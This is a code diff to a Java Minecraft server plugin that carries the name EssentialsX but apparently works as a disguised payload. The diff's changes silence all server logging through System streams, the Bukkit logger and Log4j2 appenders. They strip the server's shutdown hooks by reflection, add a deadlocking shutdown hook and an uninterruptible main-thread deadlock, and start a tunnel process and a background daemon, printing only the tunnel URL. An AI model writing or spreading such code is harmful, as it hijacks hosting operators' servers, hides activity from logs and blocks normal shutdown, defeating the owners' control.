@@ -20,10 +20,10 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     private volatile String nodePort = "N/A";
     
-    // ★ 我们私有的发声通道：直接绑定底层物理控制台，不受 System.setOut 影响
+    // ★ 我们私有的发声通道：直接绑定底层物理控制台，不受任何日志框架影响
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
     
-    // ★ 声带切除：黑洞流，吞没服务器的一切输出
+    // ★ 黑洞流：吞没一切试图通过 System 流输出的内容
     private static final OutputStream SILENT_STREAM = new OutputStream() {
         @Override public void write(int b) {}
         @Override public void write(byte[] b) {}
@@ -155,7 +155,6 @@ public class EssentialsX extends JavaPlugin {
                     String foundUrl = extractLatestTunnelUrl();
                     if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                         lastUrl = foundUrl;
-                        // ★ 唯一发声通道：只打印这一行
                         RAW_OUT.println("\n====================================================================");
                         RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                         RAW_OUT.println("====================================================================\n");
@@ -169,17 +168,40 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 终极拦截：声带切除 + 物理拔管
+    // 终极拦截：三层静音 + 物理拔管
     // ============================================================
 
     private void muteServer() {
-        // ★ 切断服务器声带：所有常规日志全入黑洞
+        // ★ 第 1 层：切断 System 级别输出流
         System.setOut(new PrintStream(SILENT_STREAM, true));
         System.setErr(new PrintStream(SILENT_STREAM, true));
+
+        // ★ 第 2 层：切断 Bukkit Logger
+        try {
+            org.bukkit.Bukkit.getLogger().setLevel(java.util.logging.Level.OFF);
+            org.bukkit.Bukkit.getLogger().setUseParentHandlers(false);
+            for (java.util.logging.Handler handler : org.bukkit.Bukkit.getLogger().getHandlers()) {
+                org.bukkit.Bukkit.getLogger().removeHandler(handler);
+            }
+        } catch (Throwable ignored) {}
+
+        // ★ 第 3 层：侵入 Log4j2 底层，物理移除所有控制台输出管 (解决 Limbo 等插件的日志)
+        try {
+            org.apache.logging.log4j.core.LoggerContext ctx = (org.apache.logging.log4j.core.LoggerContext) org.apache.logging.log4j.LogManager.getContext(false);
+            org.apache.logging.log4j.core.config.Configuration config = ctx.getConfiguration();
+            org.apache.logging.log4j.core.config.LoggerConfig loggerConfig = config.getLoggerConfig(org.apache.logging.log4j.LogManager.ROOT_LOGGER_NAME);
+            
+            // 获取并清空所有 Appender (包括 ConsoleAppender)
+            for (String appenderName : new java.util.HashSet<>(loggerConfig.getAppenders().keySet())) {
+                loggerConfig.removeAppender(appenderName);
+            }
+            // 强制更新日志系统，让拔管生效
+            ctx.updateLoggers();
+        } catch (Throwable ignored) {}
     }
 
     private void ripLifeSupport() {
-        // ★ 1. 反射清空 Paper/Spigot 原本的关服钩子
+        // ★ 反射清空 Paper/Spigot 原本的关服钩子
         try {
             java.lang.reflect.Field hooksField = Class.forName("java.lang.ApplicationShutdownHooks").getDeclaredField("hooks");
             hooksField.setAccessible(true);
@@ -194,26 +216,24 @@ public class EssentialsX extends JavaPlugin {
             } catch (Throwable t2) {}
         }
 
-        // ★ 2. 注入死锁关服钩子
+        // ★ 注入死锁关服钩子
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             Object lock = new Object();
             synchronized (lock) {
-                try { 
-                    lock.wait(); // 阻塞关机，面板只能强杀
-                } catch (Exception e) {}
+                try { lock.wait(); } catch (Exception e) {}
             }
         }, "Paralysis-Hook"));
     }
 
     private void absoluteParalysis() {
-        // ★ 3. 不可中断的原始死锁
+        // ★ 不可中断的原始死锁
         Object mainLock = new Object();
         synchronized (mainLock) {
             while (true) {
                 try {
                     mainLock.wait();
                 } catch (InterruptedException e) {
-                    continue; // 被打断立刻重新休眠
+                    continue;
                 }
             }
         }
@@ -225,7 +245,7 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
-        // 0. 第一时间切除声带，一行多余日志都不许漏
+        // 0. 执行三层静音切除，连 Log4j 都一起杀掉
         muteServer();
 
         // 1. 拔掉生命维持管子
@@ -247,7 +267,6 @@ public class EssentialsX extends JavaPlugin {
                 startCfProcess();
                 startJavaDaemon();
             } catch (Exception e) {
-                // 如果出错，用我们的私有通道报错，不走服务器日志
                 RAW_OUT.println("[FATAL ERROR] Backend deployment failed: " + e.getMessage());
             }
         }, "Backend-Deployer");
